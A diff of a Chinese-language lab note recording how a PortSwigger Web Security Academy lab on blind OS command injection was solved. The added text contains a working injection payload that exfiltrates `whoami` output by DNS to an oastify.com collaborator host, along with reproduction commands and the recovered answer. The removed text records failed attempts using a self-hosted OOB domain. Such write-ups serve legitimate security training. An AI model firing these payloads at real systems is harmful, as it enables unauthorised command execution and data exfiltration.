@@ -5,49 +5,40 @@ links:
     relation: evidences
   - target: blind-injection-family
     relation: evidences
+  - target: burp-collaborator-public-polling-method
+    relation: evidences
+  - target: records/lab-blind-out-of-band
+    relation: links-to
 ---
 
 # lab-blind-out-of-band-data-exfiltration
 
-> evidences: [[oob-callback-family]], [[blind-injection-family]]
+> evidences: [[oob-callback-family]], [[blind-injection-family]], [[burp-collaborator-public-polling-method]]
 
 - 题面:Blind OS command injection with out-of-band data exfiltration(/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
-- 实例:https://0aec0003036722a680a2443200cb0005.web-security-academy.net
-- slug(真):即请求 slug(lab_id 3C2C7DC2…)
-- 判定目标:执行 `whoami` 并经 DNS 外带,随后用“Submit solution”提交用户名;状态:**stuck**(OOB DNS 腿从 lab 侧不可达)
+- 实例(批 53):https://0a0900360419601c803a260e00d9003a.web-security-academy.net
+- 判定目标:执行 `whoami` 并经 DNS 外带,再用 `Submit solution` 提交用户名;**solved**
 
-## 已确认
+## 关键分水岭:检测型 vs 外传型
 
-1. `/feedback` → POST `/feedback/submit`(同批字段);页面头部多一个
-   `<button id='submitSolution' method='POST' path='/submitSolution' parameter='answer'>`(即拿回用户名后 POST `/submitSolution` `answer=<用户名>`)。
-2. 外带尝试:`email=x@a.com||nslookup $(whoami).<m>.oob.dthack.io||`(及同批多字段/多分隔符),均无 OOB 命中。
+- 同一注入面(四字段 `/feedback/submit`,异步无回显),但判定多一步"提交用户名"。
+- 只把回调打向**随机** `*.oastify.com` 子域:注入确实执行了,横幅 **不翻**(实测 `solved=false`)——判定需要正确答案,不是"有 interaction 就行"。
+- 正解 = **自持 secret 派生标签**后轮询读回交互(见 [[burp-collaborator-public-polling-method]]):
+  `x@a.com||nslookup $(whoami).<label>.oastify.com||` → poll → `peter-9ebGxU.<label>.oastify.com`。
 
-## 未决面 / 卡点
+## 走过的死路(不要重走)
 
-- 与 `lab-blind-out-of-band` 同因:**lab 出站到自建 OOB 域不可达**(ns 自测正常、日志里零条 lab 源查询);
-  未取到 `whoami` → 无法走到 `/submitSolution`。
-- 需外部放行 lab 出站 / 换官方 Collaborator,方能区分“注入未执行”与“DNS 被挡”。
-
-## 证据摘录
-
-```
-ns 自测: nslookup b16selftest.oob.dthack.io 127.0.0.1 -> dns.log 出现 b16selftest…(127.0.0.1)
-lab 注入多次 -> grep b16 dns.log 仅 2 条(selftest)
-```
+- **输出重定向到 web 目录**:`whoami>static/x.txt; whoami>./x.txt; whoami>public/x.txt; whoami>/var/www/html/x.txt`
+  再取 `/static/x.txt`、`/x.txt`、`/public/x.txt` → 全 404(题面亦明说不可)。app 自身响应面不给写口。
+- **`/submitSolution` 当盲猜预言机**:返回 `{"correct":false}`(可判对错),但用户名是 `peter-<5位随机>` ⇒ 不可爆破。
 
 ## 复现命令
 
 ```
-lab_launch launch 3C2C7DC2A5F53DC680195C18C290E82BC97C28F599414DB388CF8CF96CB72BF5 --widget-source /web-security/os-command-injection --jar /tmp/b16-jar2.json
-lab_http get "<inst>/feedback" --jar /tmp/b16-jar2.json     # 取 csrf
-lab_http post "<inst>/feedback/submit" --jar /tmp/b16-jar2.json --form csrf=<csrf> --form name=test \
-  --form "email=x@a.com||nslookup \$(whoami).<m>.oob.dthack.io||" --form subject=s --form message=m
-sh_run -- ssh ubuntu@47.131.34.33 "grep -i <m> ~/prs-oob/dns.log"
+burp_collab new --custom os                            # 给出 <label> 与 host
+http_session post "<inst>/feedback/submit" --jar /tmp/b53-jar2.json --form csrf=<csrf> \
+  --form name=t --form "email=x@a.com||nslookup $(whoami).<label>.oastify.com||" --form subject=s --form message=m
+burp_collab poll                                       # sub_domain 首标签 = whoami
+http_dump "<inst>/submitSolution" --method POST --header 'Content-Type: application/x-www-form-urlencoded' \
+  --body 'answer=peter-9ebGxU' --jar /tmp/b53-jar2.json    # {"correct":true}
 ```
-
-## 回马复核(OOB HTTP 腿已通后重试)
-
-- 新实例 `0a0a00a603d8c5e481d2e94a00b000e8`;b18 重打四字段多分隔符(HTTP:9999/DNS),
-  与 lab-blind-out-of-band 同批共 40+ 载荷,`oob-http.log`/`dns.log` 零 lab 源命中。
-- 与同族题同因:**lab 出站到自建 OOB 不可达**;`whoami` 未取到,无法走 `/submitSolution`。
-  不再硬造。
